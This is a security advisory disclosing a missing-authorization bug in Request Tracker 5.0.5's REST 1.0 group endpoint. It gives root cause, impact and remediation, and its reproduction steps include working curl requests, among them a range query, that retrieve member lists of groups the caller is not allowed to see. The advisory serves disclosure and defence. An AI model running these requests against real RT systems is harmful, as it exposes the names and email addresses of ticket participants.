# TTA-2026-001: Request Tracker 5.0.5 REST 1.0 group membership authorization bypass

**Severity: Medium** — Suggested CVSS 3.1: 4.3 (`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`)

### Title

Missing authorization in the REST 1.0 group handler exposes members of groups outside the caller's visibility scope.

### Summary

Request Tracker 5.0.5 does not enforce `SeeGroup` or underlying-object visibility when serving group information through the REST 1.0 group endpoint. An authenticated privileged user can retrieve membership information for groups the user is not authorized to view, including role groups associated with tickets the user cannot access.

The same canary group is rejected by the REST 2.0 endpoint and the administrative web interface, establishing that the behavior is specific to the REST 1.0 implementation.


### Affected Version

- Vendor: Best Practical Solutions, LLC
- Product: Request Tracker
- Confirmed affected version: 5.0.5
- Component: `share/html/REST/1.0/Forms/group/default`
- Endpoint: `/REST/1.0/group/<id>` and the corresponding `group/show` range form

Only RT 5.0.5 was dynamically tested. Other versions have not been claimed as affected without separate verification.


### Vulnerability Type

Missing Authorization (CWE-862; related to CWE-639).

### Affected Code

File: `share/html/REST/1.0/Forms/group/default`

Affected operation: `GET /REST/1.0/group/<synthetic-group-id>` and the corresponding group range form.

### Root Cause

The REST 1.0 group display path loads and serializes an `RT::Group` object without checking `SeeGroup` or the visibility of the group's underlying instance object. Newer API and web paths use authorization checks that are absent from this implementation.


### Steps to Reproduce

The following procedure uses only synthetic users and tickets in an isolated RT 5.0.5 instance.

1. Deploy RT 5.0.5 in a disposable lab instance with the REST 1.0 and REST 2.0 interfaces enabled. Set lab-only values:

   ```bash
   RT_BASE='http://127.0.0.1/rt'
   RT_LAB_USER='reader'
   RT_LAB_PASS='<LAB_ONLY_PASSWORD>'
   ```
2. Create a restricted synthetic queue and a synthetic ticket in that queue. Do not use a production ticket or real contact data.
3. Add a synthetic user such as `member-canary@example.test` to the ticket's AdminCc or Cc role group.
4. Create a synthetic staff account `reader` with the minimum permissions needed to authenticate. Do not grant `SeeGroup`, `SeeQueue`, or `ShowTicket` for the restricted queue.
5. Verify the authorization boundary before testing the vulnerable route. With the REST 1.0 test credentials, the ticket must be denied:

   ```bash
   curl -sS -G -o ticket-control.json -w 'HTTP %{http_code}\n' \
     --data-urlencode "user=$RT_LAB_USER" \
     --data-urlencode "pass=$RT_LAB_PASS" \
     "$RT_BASE/REST/1.0/ticket/<SYNTHETIC_TICKET_ID>"
   # Expected control: permission denied
   ```

6. Request the synthetic role group through REST 1.0 and explicitly ask for its members:

   ```bash
   curl -sS -G "$RT_BASE/REST/1.0/group/<SYNTHETIC_GROUP_ID>" \
     --data-urlencode "user=$RT_LAB_USER" \
     --data-urlencode "pass=$RT_LAB_PASS" \
     --data-urlencode 'fields=id,Name,Members' \
     -w '\nHTTP %{http_code}\n' \
     -o rest1-group.json
   ```

7. Vulnerable result: HTTP 200 and `rest1-group.json` contains the synthetic group name and `Members` list, even though the same user cannot view the ticket or group. The expected member marker is only `member-canary@example.test`.
8. Repeat through REST 2.0 using the same synthetic credentials. It should deny access:

   ```bash
   curl -sS -u "$RT_LAB_USER:$RT_LAB_PASS" -i \
     "$RT_BASE/REST/2.0/group/<SYNTHETIC_GROUP_ID>"
   # Expected secure control: HTTP 403 / Forbidden
   ```

9. Repeat through the administrative group-members page as the same reader. It should also deny access. A separate privileged lab account may be used to confirm that the group itself exists.
10. Test the range form with a small synthetic range only after the single-group case is recorded:

   ```bash
   curl -sS -G "$RT_BASE/REST/1.0/group/show" \
     --data-urlencode "id=<FIRST_SYNTHETIC_ID>-<LAST_SYNTHETIC_ID>" \
     --data-urlencode "user=$RT_LAB_USER" \
     --data-urlencode "pass=$RT_LAB_PASS" \
     --data-urlencode 'fields=id,Name,Members' \
     -o rest1-range.json
   ```

11. Record the status code, response length, synthetic group name, and canary member marker. Remove the synthetic queue, ticket, group, and users after testing. Do not store real names, email addresses, cookies, or credentials in the report.


### Impact

An authenticated staff/agent account can enumerate group names and members outside its authorization boundary. For ticket-role groups this discloses the names and email addresses of requestors, owners, Cc, and AdminCc participants for tickets that the attacker cannot view. Range requests can amplify the disclosure into broader organizational and ticket-participation mapping.

The reproduced effect is unauthorized read access; attempts to modify the canary group were rejected.


### CVSS

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` — 4.3 Medium.

## Status

Privately reported to Best Practical on 2026-10-23 and publicly disclosed on 2026-10-24. No vendor response or CVE assignment had been received at the time of publication.

## Prerequisites

- A valid authenticated privileged RT account.
- Knowledge or enumeration of a group identifier.
- No `SeeGroup`, `SeeQueue`, or `ShowTicket` permission is required for the target canary object in the reproduced scenario.

## Recommended remediation

- Require `SeeGroup` before serializing a group or its members.
- For ticket, queue, asset, and other role groups, also require visibility of the associated object.
- Apply the check to single-ID and range/list operations.
- Add negative cross-API tests proving that REST 1.0, REST 2.0, and the web interface enforce the same authorization result.

## Evidence boundary

The vulnerability was dynamically reproduced only in an isolated RT 5.0.5 laboratory instance using synthetic accounts and content. No production system, customer hostname, IP address, credential, cookie, email address, or ticket content is included in this advisory.
